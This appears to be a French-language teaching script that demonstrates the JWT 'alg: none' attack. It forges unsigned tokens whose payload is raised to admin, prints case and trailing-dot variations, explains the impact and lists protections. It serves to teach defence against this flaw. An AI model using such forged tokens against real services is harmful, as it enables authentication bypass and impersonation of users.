#!/usr/bin/env python3
"""
Démonstration de l'attaque JWT avec l'algorithme "none"

Cette attaque exploite une vulnérabilité dans certaines implémentations JWT
qui acceptent l'algorithme "none", permettant de bypasser la vérification
de signature.
"""

import base64
import json


def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    elif isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')

    encoded = base64.urlsafe_b64encode(data)
    # Retirer le padding '='
    return encoded.rstrip(b'=').decode('utf-8')


def base64url_decode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')

    # Ajouter le padding manquant
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b'=' * padding

    return base64.urlsafe_b64decode(data)


def decode_jwt(token):
    parts = token.split('.')

    if len(parts) != 3:
        raise ValueError("JWT invalide : doit contenir 3 parties")

    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    signature = parts[2]

    return header, payload, signature


def create_none_jwt(payload):
    """
    Crée un JWT malveillant avec l'algorithme "none"

    Args:
        payload (dict): Les données à inclure dans le token

    Returns:
        str: JWT forgé avec algorithme "none" et sans signature
    """
    # Header avec algorithme "none"
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # Encoder header et payload
    header_b64 = base64url_encode(header)
    payload_b64 = base64url_encode(payload)

    # JWT avec signature vide (juste un point)
    # Certaines implémentations acceptent aussi sans le point final
    forged_token = f"{header_b64}.{payload_b64}."

    return forged_token


def demonstrate_attack():
    """Démontre l'attaque complète sur un JWT"""

    print("="*70)
    print("DÉMONSTRATION : Attaque JWT avec algorithme 'none'")
    print("="*70)
    print()

    # JWT légitime (exemple)
    legitimate_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.xKAqKr5qXpXnGqVYGqPZqvqzxqXpXnGqVYGqPZqvqz"

    print("1. JWT LÉGITIME")
    print("-" * 70)
    print(f"Token: {legitimate_token}")
    print()

    # Décoder le JWT
    try:
        header, payload, signature = decode_jwt(legitimate_token)

        print("Header décodé:")
        print(json.dumps(header, indent=2))
        print()

        print("Payload décodé:")
        print(json.dumps(payload, indent=2))
        print()

        print(f"Signature: {signature}")
        print()

    except Exception as e:
        print(f"Erreur lors du décodage: {e}")
        # Utiliser un payload par défaut pour la démo
        payload = {
            "user_id": 5,
            "username": "user",
            "role": "user"
        }

    print()
    print("2. MODIFICATION DU PAYLOAD")
    print("-" * 70)

    # Modifier le payload pour élever les privilèges
    malicious_payload = payload.copy()
    malicious_payload['user_id'] = 1
    malicious_payload['username'] = 'admin'
    malicious_payload['role'] = 'admin'

    print("Nouveau payload (privilèges élevés):")
    print(json.dumps(malicious_payload, indent=2))
    print()

    print()
    print("3. CRÉATION DU JWT FORGÉ")
    print("-" * 70)

    # Créer le JWT forgé avec algorithme "none"
    forged_token = create_none_jwt(malicious_payload)

    print(f"Token forgé: {forged_token}")
    print()

    # Décoder pour vérification
    forged_header, forged_payload, forged_sig = decode_jwt(forged_token)

    print("Header du token forgé:")
    print(json.dumps(forged_header, indent=2))
    print()

    print("Payload du token forgé:")
    print(json.dumps(forged_payload, indent=2))
    print()

    print(f"Signature: '{forged_sig}' (vide)")
    print()

    print()
    print("4. IMPACT DE L'ATTAQUE")
    print("-" * 70)
    print("Si le serveur accepte l'algorithme 'none', l'attaquant peut:")
    print("- Bypasser complètement la vérification de signature")
    print("- Modifier n'importe quelle donnée dans le token")
    print("- S'accorder des privilèges admin")
    print("- Usurper l'identité de n'importe quel utilisateur")
    print()

    print()
    print("5. PROTECTION")
    print("-" * 70)
    print("Pour se protéger de cette attaque:")
    print("- Ne JAMAIS accepter l'algorithme 'none' en production")
    print("- Whitelist explicite des algorithmes acceptés (ex: ['HS256', 'RS256'])")
    print("- Toujours vérifier l'algorithme du header avant de valider")
    print("- Utiliser des bibliothèques JWT à jour et bien configurées")
    print()

    print("="*70)
    print()

    return forged_token


def create_variations():
    """Créer différentes variations de l'attaque"""
    print()
    print("VARIATIONS DE L'ATTAQUE")
    print("="*70)
    print()

    payload = {
        "user_id": 1,
        "username": "admin",
        "role": "admin"
    }

    # Variation 1: alg = "none"
    header1 = {"alg": "none", "typ": "JWT"}
    token1 = f"{base64url_encode(header1)}.{base64url_encode(payload)}."
    print("Variation 1 - alg='none' avec signature vide:")
    print(token1)
    print()

    # Variation 2: alg = "None" (majuscule)
    header2 = {"alg": "None", "typ": "JWT"}
    token2 = f"{base64url_encode(header2)}.{base64url_encode(payload)}."
    print("Variation 2 - alg='None' (case variation):")
    print(token2)
    print()

    # Variation 3: alg = "NONE" (tout en majuscules)
    header3 = {"alg": "NONE", "typ": "JWT"}
    token3 = f"{base64url_encode(header3)}.{base64url_encode(payload)}."
    print("Variation 3 - alg='NONE' (tout en majuscules):")
    print(token3)
    print()

    # Variation 4: Sans le point final
    header4 = {"alg": "none", "typ": "JWT"}
    token4 = f"{base64url_encode(header4)}.{base64url_encode(payload)}"
    print("Variation 4 - Sans point final (certaines implémentations):")
    print(token4)
    print()


if __name__ == "__main__":
    # Démonstration principale
    forged_token = demonstrate_attack()

    # Variations de l'attaque
    create_variations()

    print()
    print("AVERTISSEMENT ÉTHIQUE")
    print("="*70)
    print("Cette démonstration est à des fins pédagogiques uniquement.")
    print("N'utilisez jamais ces techniques contre des systèmes sans autorisation.")
    print("="*70)
